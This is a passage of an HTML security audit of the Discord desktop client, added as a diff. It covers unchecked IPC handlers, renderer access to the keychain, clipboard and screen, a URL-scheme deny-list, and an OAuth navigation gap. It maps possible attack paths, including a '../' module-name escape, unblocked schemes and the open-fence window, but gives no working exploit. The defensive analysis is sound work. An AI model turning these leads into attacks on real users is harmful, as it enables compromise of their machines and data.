+<code>ENCRYPT_STRING</code>, <code>DECRYPT_STRING</code> — expose the OS keychain as a general-purpose
+encrypt/decrypt oracle to whatever is running in the renderer.</p>
+
+<p><b>Evidence.</b></p>
+<pre>// app/discord_native/browser/safeStorage.js:15-21
+electron.ipcMain.on(SAFE_STORAGE_ENCRYPT_STRING, (event, plainText) =&gt; {
+  if (plainText) {
+    event.returnValue = electron.safeStorage.encryptString(plainText).toString('base64');
+  } else { event.returnValue = null; }
+});</pre>
+
+<p><b>What it means in simple English.</b> The website can hand the app any text and get it back
+encrypted with a key held in your Mac's keychain — and hand back ciphertext to get the original.
+There is no check on <i>who</i> is asking. The handler never looks at <code>event.senderFrame</code>.</p>
+
+<p><b>Why it matters.</b> It is an entirely reasonable design <i>given</i> the assumption that the
+renderer only ever runs Discord's own code. It is also the thing that converts a cross-site
+scripting bug on <code>discord.com</code> — or a client mod, or a malicious browser-style injection —
+from "can read the page" into "can decrypt everything the client ever stored." Encryption at rest
+protects against someone copying files off the disk; it does not protect against code running
+inside the renderer, and this design makes that explicit.</p>
+
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> — call sites on both sides read in full; no validation code exists in either file.</p>
+<p class="f"><b>Next step</b> <span class="small">Confirm at runtime whether <code>event.senderFrame.url</code> is ever checked in a wrapper not visible statically. Read <code>DiscordIPC.main</code> — it is not: <code>DiscordIPC.js:18-27</code> forwards arguments unmodified.</span></p>
+
+<h3>5.3 Feature trace — module install, the privilege-escalation path</h3>
+
+<div class="mermaid">
+sequenceDiagram
+  autonumber
+  participant W as Renderer
+  participant P as Preload<br/>renderer/nativeModules.js
+  participant M as Main<br/>browser/nativeModules.js
+  participant MU as common/moduleUpdater.js
+  participant CDN as discord.com/api
+  participant FS as module_data/ on disk
+
+  W->>P: DiscordNative.nativeModules.ensureModule('discord_voice')
+  P->>M: ipcRenderer.invoke(NATIVE_MODULES_INSTALL, name)
+  Note over M: :47 — name NOT checked against<br/>the /^discord_…/ regex here
+  alt new (Rust) updater present
+    M->>M: updater.installModule(name)<br/>→ compiled code, NOT ANALYSED
+  else legacy path
+    M->>MU: updater.install(name, false)
+    MU->>CDN: GET /modules/stable/{name}/{version}
+    CDN-->>MU: .zip  (TLS only — no signature)
+    MU->>FS: createWriteStream → {name}-{ver}.zip
+    MU->>FS: yauzl.open → per-entry extract
+    Note over FS: yauzl validateFileName() rejects<br/>"..", absolute paths, backslashes
+  end
+  M-->>P: resolve
+  P->>P: module.paths = getSanitizedModulePaths()
+  W->>P: requireModule('discord_voice')
+  Note over P: :41 — regex gate applied HERE
+  P->>FS: require(name) → loads native .node
+</div>
+<p class="caption">Figure 5 — Module install and load. <code>renderer/nativeModules.js:29-45</code>; <code>browser/nativeModules.js:39-72</code>; <code>common/moduleUpdater.js:560-610, 690-774</code>.</p>
+
+<p><b>The asymmetry is the finding.</b> The <i>require</i> side validates the module name:</p>
+<pre>// app/discord_native/renderer/nativeModules.js:40-45
+function requireModule(name) {
+  if (!/^discord_[a-z0-9_-]+$/.test(name) &amp;&amp; name !== 'erlpack') {
+    throw new Error('"' + String(name) + '" is not a whitelisted native module');
+  }
+  return require(name);
+}</pre>
+<p>The <i>install</i> side does not. <code>NATIVE_MODULES_INSTALL</code> passes the renderer-supplied name
+straight into the updater. Whether that is exploitable depends entirely on how the updater builds its
+URL and target path — and on the legacy path it is URL-encoded
+(<code>moduleUpdater.js:572</code>: <code>encodeURIComponent(getRemoteModuleName(…))</code>), which blocks path
+escape in the request. The destination directory is <code>path.join(moduleInstallPath, queuedModule.name)</code>
+(<code>:700</code>), which is <i>not</i> encoded — so a name containing <code>../</code> would resolve outside the
+install root. It would still need the server to return a 200 with a zip. Classified as potential,
+not confirmed (§14, F-3).</p>
+
+<h3>5.4 Feature trace — opening a link</h3>
+<p>A compact flow that shows the defensive pattern used throughout:</p>
+<pre>user clicks link in chat
+  → renderer: window.open(url, frameName)
+  → main:  mainScreen.js:436  setWindowOpenHandler({url, frameName, features})
+      ├─ frameName startsWith 'DISCORD_'  AND  origin matches WEBAPP_ENDPOINT
+      │    AND  getSanitizedPath(url) === '/popout'
+      │      → popoutWindows.openOrFocusWindow()        [internal window]
+      ├─ else if shouldOpenExternalUrl(url)             securityUtils.js:13
+      │      → saferShellOpenExternal(url)              [system browser]
+      └─ return {action:'deny'}                          [never a bare child window]</pre>
+<p><b>Why it matters.</b> <code>{action:'deny'}</code> is returned on <i>every</i> path. The handler never
+lets Chromium create a window of its own accord; internal windows are created explicitly, by
+Discord's own code, after three independent checks. This is the correct Electron pattern and it is
+applied consistently — <code>popoutWindows.js:160-168</code> repeats it for child windows.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s6">6 · Data-flow analysis</h2>
+
+<p>Five flows, each traced from origin to destination. The distinction that matters throughout:
+<b>what the code is able to move</b> versus <b>what it is demonstrated to move</b>. Nothing in this
+section was observed in flight.</p>
+
+<h3>6.1 Secrets — renderer → OS keychain</h3>
+<table>
+<tbody>
+<tr><td style="width:22%"><b>Origin</b></td><td>Renderer JavaScript (remote, from <code>discord.com</code>)</td></tr>
+<tr><td><b>Transform</b></td><td><code>safeStorage.encryptString()</code> → base64 (<code>browser/safeStorage.js:17</code>)</td></tr>
+<tr><td><b>Receiver</b></td><td>macOS Keychain for the key; ciphertext returned to the renderer</td></tr>
+<tr><td><b>Stored / transmitted?</b></td><td>Stored by the <i>web app</i>, in storage this analysis cannot see (localStorage/IndexedDB on disk under <code>~/Library/Application Support/discord/</code>)</td></tr>
+<tr><td><b>Validation</b></td><td><b>None.</b> No sender, origin, size or rate check.</td></tr>
+<tr><td><b>Unknown</b></td><td><i>What</i> is encrypted. The token-handling code lives in the remote bundle, not here. We can prove the capability exists; we cannot prove it holds auth tokens.</td></tr>
+</tbody>
+</table>
+
+<h3>6.2 Clipboard — bidirectional, preload-resident</h3>
+<p><b>What we found.</b> Clipboard <i>reading</i> does not use IPC at all. It happens in the preload,
+directly:</p>
+<pre>// app/discord_native/renderer/clipboard.js:43-45
+function read() {
+  return _electron.default.clipboard.readText();
+}</pre>
+<p>Writing is likewise direct (<code>:13</code>, <code>:21-24</code>, <code>:29-34</code>), including a
+platform-specific file-URL write for macOS. Only <code>cut</code>/<code>paste</code>/empty-<code>copy</code> go over
+IPC, and those merely trigger the focused <code>webContents</code>' own edit command
+(<code>browser/clipboard.js:11-21</code>) — they do not read data.</p>
+<p><b>Why it matters.</b> <code>DiscordNative.clipboard.read()</code> returns your entire clipboard text to
+whatever called it, with no prompt and no origin check, because it never crosses a boundary where a
+check could be applied. <code>hasMixedContent()</code> (<code>:46-52</code>) additionally enumerates all available
+clipboard formats. There is a legitimate reason (pasting images into chat); the capability is
+nonetheless unconditional.</p>
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> capability · <span class="pill p-unk">Unknown</span> whether called outside a user paste gesture — that logic is in the remote bundle.</p>
+
+<h3>6.3 Screen contents — thumbnails of every window</h3>
+<pre>// app/discord_native/browser/desktopCapturer.js:15-26
+DiscordIPC.main.handle(IPCEvents.DESKTOP_CAPTURER_GET_SOURCES, async (_, opts) =&gt; {
+  const sources = await electron.desktopCapturer.getSources(electronOptions);
+  return sources.map(source =&gt; ({
+    id: source.id,
+    name: source.name,                      // ← window titles of every open app
+    url: source.thumbnail.toDataURL(),      // ← a rendered PNG of each one
+    icon: source.appIcon?.toDataURL()
+  }));
+});</pre>
+<p><b>What it means in simple English.</b> One IPC call returns a list of every screen and window on
+your machine, each with its title and a small picture of its current contents. That is how the
+"choose what to share" picker is populated — but the data crosses into the renderer <i>before</i>
+you choose anything, and the handler has no sender check.</p>
+<p><b>Why it matters.</b> Window titles alone are sensitive (document names, bank tabs, private
+message windows). The thumbnails more so. On macOS this is partly mitigated by the OS-level Screen
+Recording permission, which Discord must already hold — but once held, it applies to every call,
+not per-call.</p>
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> capability · <span class="pill p-tent">Tentative</span> on impact — macOS TCC gating not verified at runtime.</p>
+
+<h3>6.4 Files — preload-resident, unrestricted</h3>
+<p><code>renderer/fileManager.js</code> imports <code>fs</code>, <code>node:fs/promises</code>,
+<code>node:crypto</code>, <code>node:stream</code>, <code>node-downloader-helper</code> and
+<code>@openpgp/unbzip2-stream</code> (<code>:63-80</code>) and performs direct reads, writes, <code>unlink</code>,
+<code>readdir</code> and <code>mkdir</code> throughout (verified at <code>:123, 223-248, 431-439, 484, 543-554,
+592-611</code>).</p>
+<p>Three CDN allow-lists constrain its <i>download</i> helpers, and they are real:</p>
+<pre>// renderer/fileManager.js:272 and :338
+if (!cdnURL.startsWith('https://cdn.discordapp.com/assets/content')) { … reject }
+// renderer/fileManager.js:403
+if (!cdnURL.startsWith('https://ciscobinary.openh264.org/'))        { … reject }</pre>
+<p><b>Important nuance.</b> These guards protect the <i>asset-download</i> helpers only. They say
+nothing about the general <code>fs</code> access the module holds. And <code>startsWith</code> on a URL string
+is a weaker check than parsing the origin — <code>https://cdn.discordapp.com.evil.test/assets/content</code>
+would fail it correctly, but the pattern is fragile by construction compared with
+<code>checkUrlOriginMatches()</code>, which the same codebase already provides.</p>
+
+<h3>6.5 Analytics — queued locally, transmitted by the website</h3>
+<p><b>This one corrects an intuitive but wrong assumption.</b> <code>common/analytics.js</code> has
+<code>trackSplashWindowCreated</code>, <code>trackMainWindowLoadDuration</code>, <code>trackFullTTI</code> and a
+dozen similar methods, and they all terminate in <code>this.events.push(event)</code> (<code>:29</code>).
+There is <b>no HTTP client in the file</b>. Transmission happens like this:</p>
+<pre>main → renderer:  mainScreen.js:765  webContentsSend(APP_PUSH_ANALYTICS, [event])
+renderer → main:  mainScreen.js:770  ipcMain.on(APP_GET_ANALYTICS_EVENTS, …)
+main → renderer:  mainScreen.js:782  webContentsSend(APP_PUSH_ANALYTICS, events)</pre>
+<p><b>What it means.</b> The desktop shell measures its own startup, then <i>hands the numbers to the
+web app</i> and lets the web app send them with the rest of its telemetry. The shell itself opens no
+analytics connection. Any claim about where this data ends up has to be made about
+<code>discord.com</code>'s bundle, which is outside this archive.</p>
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> — grep for every send/post/flush path in <code>analytics.js</code> returns only local queue operations.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s7">7 · Event-flow analysis</h2>
+
+<h3>7.1 What happens without you doing anything</h3>
+<table>
+<thead><tr><th>Event</th><th>Registered at</th><th>Downstream effect</th></tr></thead>
+<tbody>
+<tr><td><code>app</code> ready → startup</td><td><code>app/index.js:11</code></td><td>136 IPC handlers registered; CA store loaded; menu built</td></tr>
+<tr><td>module version check</td><td><code>moduleUpdater.js:487-494</code></td><td>Outbound HTTPS to <code>discord.com/api</code> before any window exists</td></tr>
+<tr><td><code>will-navigate</code></td><td><code>mainScreen.js:526</code></td><td><code>evt.preventDefault()</code> for any off-origin URL</td></tr>
+<tr><td><code>did-fail-load</code></td><td><code>mainScreen.js:450-464</code></td><td>Exponential backoff retry, 1 s → 20 s (<code>Backoff.js</code>)</td></tr>
+<tr><td><code>render-process-gone</code></td><td><code>mainScreen.js:502-525</code></td><td>Reload once; <b>two crashes within 5 s → <code>app.quit()</code></b> (<code>:513-517</code>)</td></tr>
+<tr><td><code>devtools-opened</code> / <code>-closed</code></td><td><code>mainScreen.js:539-544</code></td><td>Notifies the <i>website</i> that you opened developer tools</td></tr>
+<tr><td><code>focus</code> / <code>blur</code></td><td><code>mainScreen.js:545-550</code></td><td><code>MAIN_WINDOW_FOCUS</code> / <code>_BLUR</code> → drives idle state</td></tr>
+<tr><td><code>page-title-updated</code></td><td><code>mainScreen.js:551-557</code></td><td><code>preventDefault()</code> then sets the title itself</td></tr>
+<tr><td>power: suspend / resume / lock / unlock</td><td><code>browser/powerMonitor.js</code></td><td>Four channels fired to the renderer → away status</td></tr>
+<tr><td>app moves itself to <code>/Applications</code></td><td><code>moduleUpdater.js:247-271</code></td><td>On macOS, if the executable's directory is not writable and the app is not already in <code>/Applications</code>, it calls <code>app.moveToApplicationsFolder()</code></td></tr>
+</tbody>
+</table>
+
+<p><b>Two of these deserve a second look.</b></p>
+
+<div class="card warn">
+<h4>The website is told when you open DevTools</h4>
+<p class="f"><b>Evidence</b> <span><code>app/mainScreen.js:539-544</code> — <code>webContentsSend('WINDOW_DEVTOOLS_OPENED')</code>, plus channels <code>WINDOW_DEVTOOLS_OPENED</code>/<code>_CLOSED</code> in the enum at <code>IPCEvents.js:141-142</code>.</span></p>
+<p class="f"><b>Simple English</b> <span>Opening the inspector sends a message to Discord's web app. The shell does not use this itself.</span></p>
+<p class="f"><b>Why it matters</b> <span>It is a signal the remote side can act on — anti-abuse, anti-self-bot, or analytics. Benign readings exist; it is nonetheless a behaviour most users would not expect, and the desktop client has no UI disclosing it.</span></p>
+<p class="f"><b>Confidence</b> <span><span class="pill p-conf">Confirmed</span> that the message is sent. <span class="pill p-unk">Unknown</span> what the web app does with it — that code is remote.</span></p>
+</div>
+
+<div class="card warn">
+<h4>The app relocates itself on macOS</h4>
+<p class="f"><b>Evidence</b> <span><code>common/moduleUpdater.js:247-271</code>.</span></p>
+<p class="f"><b>Simple English</b> <span>Run Discord from your Downloads folder or a mounted DMG and it will try to move itself into <code>/Applications</code>, resolving conflicts by overwriting.</span></p>
+<p class="f"><b>Why it matters</b> <span>Convenient, and standard Squirrel.Mac behaviour — but it is a filesystem mutation outside the app's own container that happens with no prompt, triggered by a write-permission probe rather than by user intent.</span></p>
+<p class="f"><b>Confidence</b> <span><span class="pill p-strong">Strongly supported</span> — <code>conflictHandler</code> returns <code>true</code> (overwrite) at <code>:257-259</code>.</span></p>
+</div>
+
+<h3>7.2 Listener registered in one module, handled in another</h3>
+<p>The clearest example of cross-module event coupling, and a nice illustration of the
+dependency-injection style used throughout <code>index.js</code>:</p>
+<pre>app/index.js:96-101   windowNative.injectGetWindow(key =&gt; { … mainScreen.getMainWindowId() … })
+app/index.js:102      setNewWindowEvent(window =&gt; windowNative.newWindowEvent(window))
+                      │
+                      ├─ popoutWindows.js owns window creation
+                      ├─ browser/window.js owns the 19 WINDOW_* IPC handlers
+                      └─ neither requires the other — index.js is the only joint</pre>
+<p><b>Why it matters architecturally.</b> <code>browser/window.js</code> can serve handlers for windows it
+knows nothing about, because <code>index.js</code> hands it a lookup function. It keeps the modules
+decoupled — and it also means a static reader who skips <code>index.js</code> will conclude, wrongly, that
+<code>window.js</code> only manages the main window.</p>
+
+<h3>7.3 Cleanup</h3>
+<p><code>app/ipcMain.js:12</code> exposes <code>removeListener</code>, but a grep across <code>app/</code> finds no
+call site for it in the shipped shell. The handler set registered during <code>startup()</code> is
+effectively permanent for the process lifetime. For an app with a single main window this is not a
+leak — handlers are registered once, not per window — but it does mean <b>every one of the 136
+endpoints stays live for as long as Discord is running</b>, including during the OAuth navigation
+window discussed in §8.6.</p>
+<p class="f"><b>Confidence</b> <span class="pill p-strong">Strongly supported</span> — absence of call sites is evidence of absence only within the archive inspected; the remote bundle cannot call it.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s8">8 · Security &amp; permission-boundary analysis</h2>
+
+<p>Classification used below: <span class="pill p-conf">Design property</span> intended and correctly
+implemented · <span class="pill p-risk">Potential</span> needs verification before being called a
+vulnerability · <span class="pill p-conf">Mitigated</span> looks alarming, is not ·
+<span class="pill p-unk">Unknown</span> evidence unavailable.</p>
+
+<h3>8.1 The window configuration</h3>
+<pre>// app/mainScreen.js:350-359
+webPreferences: {
+  enableBlinkFeatures: 'EnumerateDevices,AudioOutputDevices',
+  nodeIntegration: false,      // ✓ renderer cannot require()
+  sandbox: false,              // ⚠ preload keeps full Node
+  preload: path.join(__dirname, 'mainScreenPreload.js'),
+  spellcheck: true,
+  contextIsolation: true,      // ✓ separate JS world for preload
+  additionalArguments,
+  devTools: ENABLE_DEVTOOLS
+}</pre>
+
+<div class="card warn">
+<h4>F-1 · <code>sandbox:false</code> — the decision that shapes everything else</h4>
+<p class="f"><b>Found</b> <span>The renderer is sandbox-disabled, so its preload script runs with full Node.js privileges in the same process as remote web content.</span></p>
+<p class="f"><b>Evidence</b> <span><code>app/mainScreen.js:353</code>. Corroborated by what the preload actually does: <code>renderer/fileManager.js:64-69</code> imports <code>fs</code> and <code>node:crypto</code>; <code>renderer/clipboard.js:44</code> calls <code>clipboard.readText()</code>; <code>renderer/riotGames.js:24</code> opens its own HTTPS socket.</span></p>
+<p class="f"><b>Chain</b> <span><code>mainScreen.js:353</code> → <code>:354</code> preload path → <code>mainScreenPreload.js:22-48</code> requires 26 modules → each holds direct Node APIs → <code>:68</code> exposes a façade over them to remote content.</span></p>
+<p class="f"><b>Simple English</b> <span>Context isolation keeps the website's JavaScript in its own sealed room, so it can't grab Node directly. But the room next door — the preload — has the keys to the whole house, and it hands the website a menu of things it will do on request. The wall is real; the serving hatch is wide.</span></p>
+<p class="f"><b>Why it matters</b> <span>With <code>sandbox:true</code>, a renderer-process compromise (a Chromium RCE, say) is contained by the OS sandbox. With <code>sandbox:false</code>, the preload's Node capabilities are in the same process as the attacker. This single flag converts "browser bug" into "code execution as your user."</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Design property</span> — almost certainly deliberate: the file, clipboard and native-module features as written cannot work under a sandbox. It is a documented Electron trade-off, not a mistake. It is also the highest-leverage change available to Discord.</span></p>
+<p class="f"><b>Remediation</b> <span>Move <code>fs</code>, <code>clipboard</code> and <code>https</code> work out of the preload into main-process handlers, then enable <code>sandbox:true</code>. Large change; the IPC vocabulary already exists for most of it.</span></p>
+<p class="f"><b>Next step</b> <span>Enumerate at runtime which <code>DiscordNative</code> members the web bundle actually calls, to size the migration.</span></p>
+</div>
+
+<h3>8.2 Permissions — deny by default, and that is verified</h3>
+<pre>// app/mainScreen.js:388-412  (abridged)
+session.setPermissionRequestHandler((wc, permission, callback, details) =&gt; {
+  switch (permission) {
+    case 'accessibility-events':  callback(true); return;              // ← unconditional
+    case 'notifications': case 'pointerLock':
+      callback(checkUrlOriginMatches(details.requestingUrl, WEBAPP_ENDPOINT)); return;
+    case 'fullscreen': case 'clipboard-sanitized-write':
+      callback(details.isMainFrame
+        ? checkUrlOriginMatches(details.requestingUrl, WEBAPP_ENDPOINT)
+        : true);  return;                                              // ← subframes auto-allowed
+    case 'media':
+      callback(checkUrlOriginMatches(details.requestingUrl, AllowedMediaOrigins.K_ID)
+            || … K_ID_V2 || … K_ID_FACE_SCAN); return;
+  }
+  callback(false);                                                     // ← default DENY
+});</pre>
+
+<p><b>Three observations, in descending order of importance.</b></p>
+
+<div class="card ok">
+<h4>F-2 · The default-deny terminator is present and correct</h4>
+<p class="f"><b>Simple English</b> <span>Any permission the code does not explicitly name is refused. This is the opposite of the common Electron mistake (allowing everything, or not installing a handler at all, which allows everything).</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Design property</span>, correctly implemented, in both the request and the check handler (<code>:411</code>, <code>:427</code>).</span></p>
+</div>
+
+<div class="card warn">
+<h4>F-3 · <code>media</code> is granted to the age-verification vendors but not to <code>discord.com</code></h4>
+<p class="f"><b>Found</b> <span>In <code>setPermissionRequestHandler</code>, camera/microphone access is granted <i>only</i> if the requesting URL is one of three k-id age-verification origins. <code>WEBAPP_ENDPOINT</code> is absent from that list. The <i>check</i> handler at <code>:425</code> does include <code>WEBAPP_ENDPOINT</code> — so the two handlers disagree.</span></p>
+<p class="f"><b>Evidence</b> <span><code>mainScreen.js:407-409</code> versus <code>:424-425</code>.</span></p>
+<p class="f"><b>Simple English</b> <span>If Discord's own web page asked Chromium for your microphone the normal way, this code would say no. Only the age-verification pages get a yes. Discord's actual voice chat must therefore not use the browser's microphone API at all — it goes through the compiled <code>discord_voice</code> module instead.</span></p>
+<p class="f"><b>Why it matters</b> <span>It is a genuinely interesting architectural tell: voice capture bypasses the Chromium permission system entirely, which means the browser-level permission model tells you nothing about Discord's microphone use. The audit surface for voice is the native module, not this file.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-unk">Unknown</span> whether the request/check divergence is intentional. Not a vulnerability — the stricter handler is the one that gates new grants.</span></p>
+<p class="f"><b>Next step</b> <span>Statically analyse <code>discord_voice</code> (requires Ghidra/Hopper) to establish how audio is captured, or observe <code>getUserMedia</code> calls at runtime.</span></p>
+</div>
+
+<div class="card warn">
+<h4>F-4 · <code>accessibility-events</code> is granted to any origin, and subframes get <code>fullscreen</code> unconditionally</h4>
+<p class="f"><b>Evidence</b> <span><code>mainScreen.js:390-392</code> — <code>callback(true)</code> with no origin test. <code>:402-404</code> — <code>result = true</code> for any non-main-frame requester.</span></p>
+<p class="f"><b>Simple English</b> <span>Two small holes in an otherwise tight fence. The first lets any page in the window turn on accessibility event reporting; the second lets embedded frames go fullscreen without an origin check.</span></p>
+<p class="f"><b>Why it matters</b> <span>Low severity on its own. Fullscreen-from-subframe is a classic building block for UI-spoofing (a frame that paints a fake login screen over the whole display). The mitigating factor is §8.6: only <code>WEBAPP_ENDPOINT</code> frames should exist in this window at all.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-risk">Potential</span>, low impact, requires a frame-injection primitive first.</span></p>
+<p class="f"><b>Remediation</b> <span>Apply <code>checkUrlOriginMatches</code> to both cases.</span></p>
+</div>
+
+<h3>8.3 The IPC allow-lists — real, and narrower than the surface</h3>
+
+<p><b>What we found.</b> Two explicit <code>Set</code>s gate the generic IPC façade:</p>
+<pre>// app/discord_native/renderer/ipc.js:9-29  (abridged)
+const RENDERER_IPC_SEND_WHITELIST   = new Set([ …25 channels… ]);
+const RENDERER_IPC_INVOKE_WHITELIST = new Set([ …13 channels… ]);
+
+function send(ev, ...args) {
+  const prefixedEvent = getDiscordIPCEvent(ev);
+  if (!RENDERER_IPC_SEND_WHITELIST.has(prefixedEvent)) throw new Error('cannot send this event');
+  ipcRenderer.send(prefixedEvent, ...args);
+}</pre>
+
+<p><b>Why this matters, and the catch.</b> This is a deliberate, well-built control, and it directly
+contradicts an automated finding of "no sender validation" — an important correction. But its scope
+is exactly the <code>DiscordNative.ipc</code> façade. The typed capability modules do not go through it:</p>
+
+<table>
+<thead><tr><th>Path</th><th>Transport</th><th>Allow-listed?</th></tr></thead>
+<tbody>
+<tr><td><code>DiscordNative.ipc.send/invoke</code></td><td><code>renderer/ipc.js</code></td><td><b>Yes</b> — 25 send + 13 invoke</td></tr>
+<tr><td><code>DiscordNative.safeStorage.*</code></td><td><code>ipcRenderer.sendSync</code> direct</td><td><b>No</b></td></tr>
+<tr><td><code>DiscordNative.desktopCapture.*</code></td><td><code>DiscordIPC.renderer.invoke</code></td><td><b>No</b></td></tr>
+<tr><td><code>DiscordNative.nativeModules.*</code></td><td><code>ipcRenderer.invoke</code> direct</td><td><b>No</b></td></tr>
+<tr><td><code>DiscordNative.fileManager.*</code></td><td>direct <code>fs</code> — no IPC at all</td><td>N/A</td></tr>
+</tbody>
+</table>
+
+<p><b>Simple English.</b> There is a guest list on the front door, and it is enforced. There are also
+24 side doors, one per capability, each with its own lock and no guest list. The front door guards the
+<i>general-purpose</i> channel; the specific channels guard themselves, or don't.</p>
+
+<p><b>Why it matters.</b> 136 handlers are registered; 38 channel names are allow-listed. The
+remaining ~98 are reachable through their typed modules by anything running in the renderer. That is
+not a flaw in the allow-list — it was never meant to cover them — but it means the allow-list should
+not be read as the client's IPC boundary. The boundary is the <code>DiscordNative</code> object itself.</p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Design property</span>. Correct implementation, limited scope.</span></p>
+<p class="f"><b>Remediation</b> <span>Add a shared <code>event.senderFrame</code> origin assertion inside <code>DiscordIPC.main.on/handle</code> (<code>DiscordIPC.js:18-27</code>) — a single ~5-line change that would cover all 136 registrations at once. This is the highest-value, lowest-cost hardening available in the JS tier.</span></p>
+
+<h3>8.4 No handler validates its sender</h3>
+<p><b>Evidence.</b> <code>DiscordIPC.js:18-27</code> forwards <code>...args</code> to the listener unmodified
+and inspects nothing. <code>app/ipcMain.js:11-14</code> likewise. Across all 24 <code>browser/</code> modules, a
+grep for <code>senderFrame</code>, <code>event.sender</code> origin checks or <code>webContents.getURL()</code>
+comparisons inside handlers returns <b>no hits</b> other than <code>mainScreen.js:482</code> (which is an
+auth-flow state check, not a handler guard).</p>
+<p><b>What it means.</b> Any frame in the window — main frame, iframe, popout, or the OAuth page
+during its navigation window — can invoke any of the 136 handlers that its preload exposes. The
+model is "we trust the renderer because we control what loads there," enforced by §8.6 rather than
+per-handler.</p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Design property</span> — consistent, and consistent with the <code>sandbox:false</code> decision. Also the single point where defence-in-depth is thinnest.</span></p>
+
+<h3>8.5 <code>securityUtils.js</code> — 42 lines doing the heavy lifting</h3>
+<pre>// common/securityUtils.js:12-23, 32-42
+const BLOCKED_URL_PROTOCOLS = ['file:', 'javascript:', 'vbscript:', 'data:',
+                               'about:', 'chrome:', 'ms-cxh:', 'ms-cxh-full:', 'ms-word:'];
+
+function shouldOpenExternalUrl(externalUrl) {
+  let parsedUrl;
+  try { parsedUrl = url.parse(externalUrl); } catch (_) { return false; }
+  if (parsedUrl.protocol == null ||
+      BLOCKED_URL_PROTOCOLS.includes(parsedUrl.protocol.toLowerCase())) return false;
+  return true;
+}
+
+function checkUrlOriginMatches(urlA, urlB) {
+  …
+  return parsedUrlA.protocol === parsedUrlB.protocol
+      && parsedUrlA.slashes  === parsedUrlB.slashes
+      && parsedUrlA.host     === parsedUrlB.host;
+}
+</pre>
+
+<div class="card warn">
+<h4>F-5 · The protocol filter is a deny-list, and it uses legacy <code>url.parse</code></h4>
+<p class="f"><b>Found</b> <span>External-URL safety is decided by a nine-entry deny-list of dangerous schemes, rather than an allow-list of <code>http:</code>/<code>https:</code>/<code>mailto:</code>.</span></p>
+<p class="f"><b>Simple English</b> <span>Instead of "only these schemes are safe," the code says "these nine are unsafe, everything else goes to the operating system." Anything not on the list — <code>smb:</code>, <code>vscode:</code>, <code>itms-services:</code>, any third-party app's custom scheme — is passed to <code>shell.openExternal</code>.</span></p>
+<p class="f"><b>Why it matters</b> <span>Deny-lists age badly. The presence of <code>ms-cxh:</code> and <code>ms-word:</code> is itself the evidence: those were added after someone found them. Each new entry is a bug that already happened. An allow-list would have pre-empted all of them. Separately, <code>url.parse</code> is Node's legacy parser with known WHATWG divergences; <code>new URL()</code> is the correct tool for a security decision.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-risk">Potential</span> — exploitability depends on which schemes are registered on the specific host, so it cannot be called a vulnerability in general.</span></p>
+<p class="f"><b>Remediation</b> <span>Invert to an allow-list; migrate to WHATWG <code>URL</code>.</span></p>
+<p class="f"><b>Next step</b> <span>Enumerate registered URL schemes on a test host and attempt each through a chat link in an authorised environment.</span></p>
+</div>
+
+<p><b>On <code>checkUrlOriginMatches</code>.</b> Comparing <code>protocol</code> + <code>slashes</code> +
+<code>host</code> is a reasonable origin comparison — and <code>host</code> (not <code>hostname</code>) includes
+the port, so <code>discord.com:8443</code> correctly fails against <code>discord.com</code>. This one is
+sound. <span class="pill p-conf">Design property</span></p>
+
+<h3>8.6 Navigation fencing — and the OAuth exception</h3>
+<pre>// app/mainScreen.js:526-535
+mainWindow.webContents.on('will-navigate', (evt, url) =&gt; {
+  if (!insideAuthFlow &amp;&amp; !checkUrlOriginMatches(url, WEBAPP_ENDPOINT)) {
+    evt.preventDefault();
+  }
+});
+mainWindow.webContents.on('did-get-redirect-request', (event, oldUrl, newUrl) =&gt; {
+  if (checkUrlOriginMatches(oldUrl, WEBAPP_ENDPOINT) &amp;&amp;
+      checkUrlOriginMatches(newUrl, 'https://accounts.google.com/')) {
+    insideAuthFlow = true;
+  }
+});</pre>
+
+<div class="card bad">
+<h4>F-6 · While <code>insideAuthFlow</code> is true, the origin fence is fully open</h4>
+<p class="f"><b>Found</b> <span>A single boolean suspends the navigation restriction. It is set when a redirect goes from <code>discord.com</code> to <code>accounts.google.com</code>, and cleared only when the web app signals <code>APP_ASYNC_INDEX_TSX_LOADED</code> <i>and</i> the current URL is back on <code>WEBAPP_ENDPOINT</code> (<code>:482-484</code>).</span></p>
+<p class="f"><b>Chain</b> <span><code>:531</code> redirect observed → <code>insideAuthFlow = true</code> → <code>:527</code> the <code>!insideAuthFlow</code> guard short-circuits, so <b>no</b> origin check runs on any navigation → <code>:482</code> flag cleared on successful return. During the window, all 136 IPC handlers remain registered (§7.3) and the same preload is attached.</span></p>
+<p class="f"><b>Simple English</b> <span>To let you sign in with Google, the app temporarily stops checking which websites it is allowed to visit. The "all clear" is a flag flipped on one specific redirect, and it stays flipped until the web app reports it is home again.</span></p>
+<p class="f"><b>Why it matters</b> <span>It is the correct general shape — OAuth genuinely requires leaving your origin — but the implementation is coarse in three ways: (a) the permit is unbounded rather than restricted to the OAuth provider's origin; (b) there is no timeout, so a flow that is abandoned mid-way leaves the fence down; (c) clearing depends on a message from the renderer, which is the party you would be defending against. A page reached during this window shares a renderer process that has a Node-capable preload attached.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-risk">Potential</span> — a real weakening of a real control. Calling it exploitable requires showing an attacker can trigger or extend the window, which this static analysis does not establish.</span></p>
+<p class="f"><b>Remediation</b> <span>Replace the boolean with an allow-list of expected OAuth origins plus a short timeout; clear the flag on <code>did-navigate</code> back to <code>WEBAPP_ENDPOINT</code> rather than on a renderer-sent message. Better still, run the OAuth flow in a dedicated window with no preload.</span></p>
+<p class="f"><b>Next step</b> <span>In an authorised test build, set <code>insideAuthFlow</code> and attempt navigation to an arbitrary origin; confirm the preload is attached and <code>window.DiscordNative</code> is populated on that page. This is the decisive test and it was <b>not</b> performed.</span></p>
+</div>
+
